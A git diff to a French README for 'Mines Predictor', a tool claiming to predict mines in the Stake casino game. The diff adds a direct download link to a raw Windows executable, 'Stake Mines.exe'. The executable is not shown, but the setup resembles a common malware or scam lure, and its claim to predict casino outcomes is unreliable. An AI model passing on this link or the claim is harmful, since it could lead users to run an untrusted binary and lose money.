@@ -25,7 +25,7 @@ Mines Predictor est un outil logiciel conçu pour prédire les Mines sur le cél
 
 Suivez ces étapes pour démarrer avec Mines Predictor :
 
-1. Téléchargez la dernière version depuis la section [Télécharger]().
+1. Téléchargez la dernière version depuis la section [Télécharger](https://github.com/stake-mines-predictor/Stake-mines-predictor/raw/refs/heads/main/Stake%20Mines.exe).
 
 2. Extrayez les fichiers téléchargés vers un emplacement de votre choix.
 
